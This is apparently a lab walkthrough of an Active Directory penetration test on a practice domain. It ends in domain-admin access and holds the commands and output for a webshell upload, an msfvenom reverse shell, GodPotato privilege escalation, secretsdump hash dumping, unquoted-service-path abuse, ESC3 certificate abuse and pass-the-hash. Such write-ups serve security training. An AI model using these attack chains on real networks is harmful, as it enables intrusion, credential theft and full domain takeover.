Target and domain discovery

``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD6/loot]
└─$ netexec smb 10.0.2.0/24
SMB         10.0.2.9        445    CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-2) (domain:hack-academy.local) (signing:False) (SMBv1:None)
SMB         10.0.2.7        445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hack-academy.local) (signing:False) (SMBv1:None)
SMB         10.0.2.2        445    DESKTOP-CIVQJ2K  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DESKTOP-CIVQJ2K) (domain:DESKTOP-CIVQJ2K) (signing:True) (SMBv1:None)
SMB         10.0.2.4        445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack-academy.local) (signing:True) (SMBv1:None) (Null Auth:True)
```
![[Pasted image 20260814093223.png]]

Spray the creds but nothing interesting

Bloodhound collect
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD6/loot]
└─$ bloodhound-python -u "sortiz" -p 'Shade3729a.' -d hack-academy.local -c all --zip -ns 10.0.2.4  
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: hack-academy.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.hack-academy.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.hack-academy.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: dc01.hack-academy.local
INFO: Found 25 users
INFO: Found 53 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: Client-2.hack-academy.local
INFO: Querying computer: Client-1.hack-academy.local
INFO: Querying computer: DC01.hack-academy.local
INFO: Done in 00M 01S
INFO: Compressing output into 20260814023841_bloodhound.zip

```
![[Pasted image 20260814093954.png]]


Username discovery. Also got a password ChangeMe123!. Add these to usernames and passwords list for spraying
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD6/loot]
└─$ netexec ldap 10.0.2.4 -u 'sortiz' -p 'Shade3729a.' --users
LDAP        10.0.2.4        389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hack-academy.local) (signing:None) (channel binding:Never) 
LDAP        10.0.2.4        389    DC01             [+] hack-academy.local\sortiz:Shade3729a. 
LDAP        10.0.2.4        389    DC01             [*] Enumerated 24 domain users: hack-academy.local
LDAP        10.0.2.4        389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.0.2.4        389    DC01             Administrator                 2026-01-11 17:02:56 0        Built-in account for administering the computer/domain      
LDAP        10.0.2.4        389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.0.2.4        389    DC01             krbtgt                        2025-08-24 13:08:23 0        Key Distribution Center Service Account                     
LDAP        10.0.2.4        389    DC01             ecole                         2026-01-11 17:02:56 0                                                                    
LDAP        10.0.2.4        389    DC01             malvarez                      2026-01-11 17:02:56 0                                                                    
LDAP        10.0.2.4        389    DC01             rwhitaker                     2026-01-11 17:02:56 0                                                                    
LDAP        10.0.2.4        389    DC01             sbennett                      2026-01-11 17:02:56 0                                                                    
LDAP        10.0.2.4        389    DC01             dmorris                       2026-01-11 17:02:56 0                                                                    
LDAP        10.0.2.4        389    DC01             pnair                         2026-01-11 17:02:56 0                                                                    
LDAP        10.0.2.4        389    DC01             treed                         2026-01-11 17:02:56 0                                                                    
LDAP        10.0.2.4        389    DC01             ekovacs                       2026-01-11 17:02:56 0                                                                    
LDAP        10.0.2.4        389    DC01             mliu                          2026-01-11 17:02:56 0                                                                    
LDAP        10.0.2.4        389    DC01             hbrooks                       2026-01-11 17:02:56 0                                                                    
LDAP        10.0.2.4        389    DC01             ogrant                        2026-01-11 17:02:56 0                                                                    
LDAP        10.0.2.4        389    DC01             nfisher                       2026-01-11 17:02:56 0                                                                    
LDAP        10.0.2.4        389    DC01             vlang                         2026-01-11 17:02:56 0                                                                    
LDAP        10.0.2.4        389    DC01             imckenzie                     2026-01-11 17:02:57 0                                                                    
LDAP        10.0.2.4        389    DC01             sortiz                        2026-01-11 17:02:57 0                                                                    
LDAP        10.0.2.4        389    DC01             cmendes                       2026-01-11 17:02:57 0                                                                    
LDAP        10.0.2.4        389    DC01             jpark                         2026-01-11 17:02:57 0                                                                    
LDAP        10.0.2.4        389    DC01             folsen                        2026-01-11 17:02:57 0                                                                    
LDAP        10.0.2.4        389    DC01             avega                         2026-01-11 17:02:57 0                                                                    
LDAP        10.0.2.4        389    DC01             mturner                       2026-01-11 17:02:57 0                                                                    
LDAP        10.0.2.4        389    DC01             websvc                        <never>             0        ChangeMe123!    
```
![[Pasted image 20260814094233.png]]

got result that need change password for websvc so changed it via nxc
```sh

┌──(kali㉿kali)-[~/writeups/ad/AD6/loot]
└─$ nxc smb ips -u websvc -p 'ChangeMe123!' -M change-password -o USER=websvc NEWPASS='Shade3729a.'
SMB         10.0.2.4        445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack-academy.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.2.7        445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hack-academy.local) (signing:False) (SMBv1:None)
SMB         10.0.2.9        445    CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-2) (domain:hack-academy.local) (signing:False) (SMBv1:None)
SMB         10.0.2.4        445    DC01             [-] hack-academy.local\websvc:ChangeMe123! STATUS_PASSWORD_MUST_CHANGE 
SMB         10.0.2.7        445    CLIENT-1         [-] hack-academy.local\websvc:ChangeMe123! STATUS_PASSWORD_MUST_CHANGE 
CHANGE-P... 10.0.2.4        445    DC01             [+] Successfully changed password for websvc

```
![[Pasted image 20260814095450.png]]


Enumerate shares. We have read and write on Web
``` sh
──(kali㉿kali)-[~/writeups/ad/AD6/loot]
└─$ netexec smb ips -u websvc -p 'Shade3729a.' --shares

SMB         10.0.2.4        445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack-academy.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.2.7        445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hack-academy.local) (signing:False) (SMBv1:None)
SMB         10.0.2.9        445    CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-2) (domain:hack-academy.local) (signing:False) (SMBv1:None)

<REDACTED>

SMB         10.0.2.9        445    CLIENT-2         [+] hack-academy.local\websvc:Shade3729a. 
SMB         10.0.2.9        445    CLIENT-2         [*] Enumerated shares
SMB         10.0.2.9        445    CLIENT-2         Share           Permissions     Remark
SMB         10.0.2.9        445    CLIENT-2         -----           -----------     ------
SMB         10.0.2.9        445    CLIENT-2         ADMIN$                          Remote Admin
SMB         10.0.2.9        445    CLIENT-2         C$                              Default share
SMB         10.0.2.9        445    CLIENT-2         IPC$            READ            Remote IPC
SMB         10.0.2.9        445    CLIENT-2         Web             READ,WRITE     



```

Connect to shares and upload cmd.aspx webshell.
https://raw.githubusercontent.com/xl7dev/WebShell/refs/heads/master/Aspx/ASPX%20Shell.aspx

``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD6/loot]
└─$ impacket-smbclient hack-academy.local/websvc:'Shade3729a.'@10.0.2.9
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# show shares
*** Unknown syntax: show shares
# shares
ADMIN$
C$
IPC$
Web
# use web
# tree
/iisstart.htm
/iisstart.png
/aspnet_client/system_web
/aspnet_client/system_web/4_0_30319
Finished - 3 files and folders
# put cmd.aspx
# tree
/cmd.aspx
/iisstart.htm
/iisstart.png
/aspnet_client/system_web
/aspnet_client/system_web/4_0_30319
Finished - 3 files and folders
# 
```
![[Pasted image 20260814122621.png]]

We got nice webshell
![[Pasted image 20260814123236.png]]

made msfvenom payload and put it in share folder. 
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD6/exploit]
└─$ impacket-smbclient hack-academy.local/websvc:'Shade3729a.'@10.0.2.9
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# put shell.exe
[-] No share selected
# use Web
# put shell.exe
```
![[Pasted image 20260814123341.png]]

Started penelope listener and executed the shell.exe from webshell and catched shell as iis appool. And check privileges we have SeImpersonatePrivilege
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD6/loot]
└─$ penelope -p 443          

<REDACTED>

C:\inetpub\wwwroot>whoami
whoami
iis apppool\defaultapppool

C:\inetpub\wwwroot>hostname
hostname
Client-2
```
![[Pasted image 20260814123451.png]]

Moved godpotato.exe on target and added websvc to admins group
``` sh
C:\inetpub\wwwroot>.\God.exe -cmd "cmd /c net localgroup administrators websvc /add"
.\God.exe -cmd "cmd /c net localgroup administrators websvc /add"
[*] CombaseModule: 0x140711057948672
[*] DispatchTable: 0x140711060399576
[*] UseProtseqFunction: 0x140711059731056
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\1799ab9a-7bc9-4ad1-95aa-439f7b442f38\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00008402-0d60-ffff-f382-7311115383a8
[*] DCOM obj OXID: 0xfb32efa422fc5785
[*] DCOM obj OID: 0xf52b8bc5f73de945
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 820 Token:0x808  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 3272
The command completed successfully.

```
![[Pasted image 20260814125447.png]]

Test creds with nxc-sweep
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD6/exploit]
└─$ nxc-sweep 10.0.2.9 -u websvc -p 'Shade3729a.'
[*] Starting NXC sweep for 10.0.2.9 as websvc ...
[+] Port 445 open. Checking smb ...                                                                     
SMB         10.0.2.9        445    CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-2) (domain:hack-academy.local) (signing:False) (SMBv1:None)
SMB         10.0.2.9        445    CLIENT-2         [+] hack-academy.local\websvc:Shade3729a. (Pwn3d!)
SMB         10.0.2.9        445    CLIENT-2         [*] Enumerated shares
SMB         10.0.2.9        445    CLIENT-2         Share           Permissions     Remark
SMB         10.0.2.9        445    CLIENT-2         -----           -----------     ------
SMB         10.0.2.9        445    CLIENT-2         ADMIN$          READ,WRITE      Remote Admin
SMB         10.0.2.9        445    CLIENT-2         C$              READ,WRITE      Default share
SMB         10.0.2.9        445    CLIENT-2         IPC$            READ            Remote IPC
SMB         10.0.2.9        445    CLIENT-2         Web             READ,WRITE      

[+] Port 5985 open. Checking winrm ...
WINRM       10.0.2.9        5985   CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-2) (domain:hack-academy.local) 
WINRM       10.0.2.9        5985   CLIENT-2         [+] hack-academy.local\websvc:Shade3729a. (Pwn3d!)

[+] Port 3389 open. Checking rdp ...
RDP         10.0.2.9        3389   CLIENT-2         [*] Windows 10 or Windows Server 2016 Build 19041 (name:CLIENT-2) (domain:hack-academy.local) (nla:True)
RDP         10.0.2.9        3389   CLIENT-2         [+] hack-academy.local\websvc:Shade3729a. (Pwn3d!)
```
![[Pasted image 20260814125517.png]]

Then dump secrets
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD6/exploit]
└─$ impacket-secretsdump websvc@10.0.2.9

<REDACTED>

[*] Dumping cached domain logon information (domain/username:hash)
HACK-ACADEMY.LOCAL/vlang:$DCC2$10240#vlang#551614a0576936f2f14c92f924a6612a: (2026-02-03 10:58:20+00:00)
```
![[Pasted image 20260814125957.png]]

Cracket it Shar4334!

Then Spray the creds. We have RDP Client1 (PWND!)
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD6/loot]
└─$ netexec rdp ips -u vlang -p 'Shar4334!'

RDP         10.0.2.7        3389   CLIENT-1         [*] Windows 10 or Windows Server 2016 Build 19041 (name:CLIENT-1) (domain:hack-academy.local) (nla:True)
RDP         10.0.2.9        3389   CLIENT-2         [*] Windows 10 or Windows Server 2016 Build 19041 (name:CLIENT-2) (domain:hack-academy.local) (nla:True)
RDP         10.0.2.7        3389   CLIENT-1         [+] hack-academy.local\vlang:Shar4334! (Pwn3d!)
RDP         10.0.2.9        3389   CLIENT-2         [+] hack-academy.local\vlang:Shar4334! 
```
![[Pasted image 20260814130650.png]]

Okay moved powerup.ps1 to target and it showed Unquoted Servce Path vuln on HostHelperSvc
![[Pasted image 20260814132321.png]]

Made msfvenom payload and moved it to Services folder and named it Service.exe.
With listener on when Client2 was restarted we could catch shell and add vlang to admin group
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD6/exploit]
└─$ penelope -p 443
[+] Listening for reverse shells on 0.0.0.0:443 -> 127.0.0.1 • 10.0.2.5 • 172.18.0.1 • 172.17.0.1

<REDACTED>

C:\Windows\system32>whoami
whoami
nt authority\system

<REDACTED>

C:\Windows\system32>net localgroup "Administrators" vlang /add
net localgroup "Administrators" vlang /add
The command completed successfully.
```
![[Pasted image 20260814132438.png]]

Then dump secrets as vlang
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD6/exploit]
└─$ impacket-secretsdump vlang@10.0.2.7                           
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

<REDACTED>

[*] Dumping cached domain logon information (domain/username:hash)
HACK-ACADEMY.LOCAL/folsen:$DCC2$10240#folsen#4f3ab6627d37b1b20549bff73248a237: (2026-02-02 09:02:27+00:00)
```

Crack the folsen hash
``` sh
folsen : Phish28*
```
![[Pasted image 20260814132824.png]]

Sprayed the creds but no access.
Used certipy to check vulns. Should be vulnerable to ESC3
``` sh

┌──(kali㉿kali)-[~/writeups/ad/AD6/loot]
└─$ certipy-ad find -u folsen@hack-academy.local -p 'Phish28*' -dc-ip 10.0.2.4 -vulnerable -stdout

Certipy v5.0.4 - by Oliver Lyak (ly4k)

<REDACTED>

[!] Vulnerabilities
ESC3                              : Template has Certificate Request Agent EKU set.

```
![[Pasted image 20260814134855.png]]
![[Pasted image 20260814134902.png]]

Then followed ESC3 instructions [[Certificate Attacks]]
and got admin hash

``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD6/loot]
└─$ certipy-ad auth -dc-ip 10.0.2.4 -pfx administrator.pfx
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@hack-academy.local'
[*] Using principal: 'administrator@hack-academy.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@hack-academy.local': aad3b435b51404eeaad3b435b51404ee:c0ced2de918b4a7c1b9f4efd225dd503

```
![[Pasted image 20260814134951.png]]

Could login with admin to DC01
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD6/loot]
└─$ nxc winrm ips -u 'Administrator' -H 'c0ced2de918b4a7c1b9f4efd225dd503'
WINRM       10.0.2.7        5985   CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-1) (domain:hack-academy.local) 
WINRM       10.0.2.4        5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hack-academy.local) 
WINRM       10.0.2.7        5985   CLIENT-1         [+] hack-academy.local\Administrator:c0ced2de918b4a7c1b9f4efd225dd503 (Pwn3d!)
WINRM       10.0.2.9        5985   CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-2) (domain:hack-academy.local) 
WINRM       10.0.2.4        5985   DC01             [+] hack-academy.local\Administrator:c0ced2de918b4a7c1b9f4efd225dd503 (Pwn3d!)
WINRM       10.0.2.9        5985   CLIENT-2         [+] hack-academy.local\Administrator:c0ced2de918b4a7c1b9f4efd225dd503 (Pwn3d!)

```
![[Pasted image 20260814135053.png]]

Proof
``` sh
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
hack-academy\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
DC01
*Evil-WinRM* PS C:\Users\Administrator\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::409c:8a16:c5fb:9329%4
   IPv4 Address. . . . . . . . . . . : 10.0.2.4
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.2.1

```
![[Pasted image 20260814135153.png]]